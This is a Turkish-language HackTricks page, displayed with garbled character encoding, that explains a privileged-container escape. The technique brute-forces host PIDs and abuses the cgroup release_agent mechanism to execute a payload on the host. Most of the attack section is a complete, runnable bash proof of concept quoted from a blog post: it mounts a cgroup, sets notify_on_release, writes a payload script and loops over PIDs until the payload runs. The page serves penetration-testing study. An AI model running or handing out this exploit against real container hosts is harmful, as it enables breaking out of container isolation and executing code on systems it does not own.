<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

Daha fazla ayrÄ±ntÄ± iÃ§in **[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)** adresindeki blog yazÄ±sÄ±nÄ± kontrol edin. Ä°ÅŸte sadece bir Ã¶zet:

Teknik, **bir konteyner iÃ§inden ana bilgisayarda kod Ã§alÄ±ÅŸtÄ±rmak** iÃ§in bir yÃ¶ntem aÃ§Ä±klar. Bu yÃ¶ntem, konteynerin dosya sistemi yolunu bulmayÄ± zorlaÅŸtÄ±ran depolama sÃ¼rÃ¼cÃ¼sÃ¼ yapÄ±landÄ±rmalarÄ±nÄ± (Kata Containers veya belirli `devicemapper` ayarlarÄ± gibi) aÅŸar.

Ana adÄ±mlar:

1. **Ä°ÅŸlem Kimliklerini (PID'leri) Bulma:** Linux sahte dosya sistemindeki `/proc/<pid>/root` sembolik baÄŸlantÄ±sÄ±nÄ± kullanarak, konteyner iÃ§indeki herhangi bir dosya ana bilgisayarÄ±n dosya sistemiyle iliÅŸkilendirilebilir. Bu, konteynerin ana bilgisayardaki dosya sistemi yolunu bilmek gereksinimini ortadan kaldÄ±rÄ±r.
2. **PID SaldÄ±rÄ±sÄ±:** Ana bilgisayardaki PID'leri aramak iÃ§in kaba kuvvet yÃ¶ntemi kullanÄ±lÄ±r. Bu, sÄ±rasÄ±yla `/proc/<pid>/root/<dosya>` konumunda belirli bir dosyanÄ±n varlÄ±ÄŸÄ±nÄ± kontrol ederek yapÄ±lÄ±r. Dosya bulunduÄŸunda, ilgili PID'nin hedef konteyner iÃ§inde Ã§alÄ±ÅŸan bir iÅŸleme ait olduÄŸunu gÃ¶sterir.
3. **Ã‡alÄ±ÅŸtÄ±rmayÄ± Tetikleme:** Tahmin edilen PID yolunu `cgroups release_agent` dosyasÄ±na yazmak. Bu eylem, `release_agent`'Ä±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± tetikler. Bu adÄ±mÄ±n baÅŸarÄ±lÄ± olduÄŸu, bir Ã§Ä±ktÄ± dosyasÄ±nÄ±n oluÅŸturulup oluÅŸturulmadÄ±ÄŸÄ± kontrol edilerek doÄŸrulanÄ±r.

### SaldÄ±rÄ± SÃ¼reci

SaldÄ±rÄ± sÃ¼reci, konteyner iÃ§inde Ã§alÄ±ÅŸan bir iÅŸlemin doÄŸru PID'sini tahmin ederek ana bilgisayarda bir yÃ¼k Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§layan daha ayrÄ±ntÄ±lÄ± bir dizi eylemi iÃ§erir. Ä°ÅŸte nasÄ±l gerÃ§ekleÅŸir:

1. **OrtamÄ± BaÅŸlatma:** Ana bilgisayarda bir yÃ¼k betiÄŸi (`payload.sh`) hazÄ±rlanÄ±r ve cgroup manipÃ¼lasyonu iÃ§in benzersiz bir dizin oluÅŸturulur.
2. **YÃ¼kÃ¼ HazÄ±rlama:** Ana bilgisayarda Ã§alÄ±ÅŸtÄ±rÄ±lacak komutlarÄ± iÃ§eren yÃ¼k betiÄŸi yazÄ±lÄ±r ve Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirilir.
3. **Cgroup AyarlarÄ±:** Cgroup baÄŸlanÄ±r ve yapÄ±landÄ±rÄ±lÄ±r. `notify_on_release` bayraÄŸÄ±, cgroup serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda yÃ¼kÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlamak iÃ§in ayarlanÄ±r.
4. **PID Kaba Kuvveti:** Bir dÃ¶ngÃ¼, potansiyel PID'ler arasÄ±nda dolaÅŸarak her tahmin edilen PID'yi `release_agent` dosyasÄ±na yazar. Bu, etkili bir ÅŸekilde yÃ¼k betiÄŸini `release_agent` olarak ayarlar.
5. **Tetikleme ve Ã‡alÄ±ÅŸmanÄ±n KontrolÃ¼:** Her PID iÃ§in, yÃ¼k betiÄŸinin Ã§Ä±ktÄ±sÄ± bulunana kadar cgroup'Ä±n `cgroup.procs`'una yazÄ±lÄ±r. Bu, PID'nin doÄŸru olduÄŸunda `release_agent`'Ä±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± tetikler. DÃ¶ngÃ¼, yÃ¼k betiÄŸinin Ã§Ä±ktÄ±sÄ± bulunana kadar devam eder, bu da baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir.


Blog yazÄ±sÄ±ndan PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
